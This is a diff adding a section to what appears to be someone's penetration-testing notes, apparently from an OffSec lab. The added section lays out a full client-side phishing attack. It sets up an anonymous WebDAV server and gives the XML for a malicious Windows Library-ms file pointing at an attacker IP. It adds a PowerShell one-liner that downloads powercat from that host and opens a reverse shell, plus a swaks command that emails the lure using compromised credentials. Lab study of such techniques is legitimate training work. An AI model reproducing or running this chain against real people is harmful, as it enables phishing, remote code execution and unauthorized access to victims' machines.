@@ -31,7 +31,36 @@ Transfer File From Windows To Linux via ssh:
 file metadata analyzer:
 
     exiftool -a -u <file.name>
-  
+
+Client side attack through mail with library using webdav:
+
+    mkdir /home/shaleph/offsec/relia/webdav
+    /home/shaleph/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/shaleph/offsec/relia/webdav/
+    make config.Library-ms file in visual code studio with code inside:
+        <?xml version="1.0" encoding="UTF-8"?>
+        <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+        <name>@windows.storage.dll,-34582</name>
+        <version>6</version>
+        <isLibraryPinned>true</isLibraryPinned>
+        <iconReference>imageres.dll,-1003</iconReference>
+        <templateInfo>
+        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+        </templateInfo>
+        <searchConnectorDescriptionList>
+        <searchConnectorDescription>
+        <isDefaultSaveLocation>true</isDefaultSaveLocation>
+        <isSupported>false</isSupported>
+        <simpleLocation>
+        <url>http://192.168.45.232</url>
+        </simpleLocation>
+        </searchConnectorDescription>
+        </searchConnectorDescriptionList>
+        </libraryDescription>
+    create shortcut of powershell download and run powercat revshell and copy inside webdav folder:
+        cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+        powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.232:8000/powercat.ps1'); powercat -c 192.168.45.232 -p 4444 -e powershell"
+    send mail with valid credentials linking our webdav folder and with valid text in body.txt (-t is target -from is valid creds --server is target mail srv):
+        sudo swaks -t daniela@beyond.com -t jim@relia.com --from john@beyond.com --attach @config.Library-ms --server 192.168.234.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap   
 Web App Pentest
 
     Command Injection
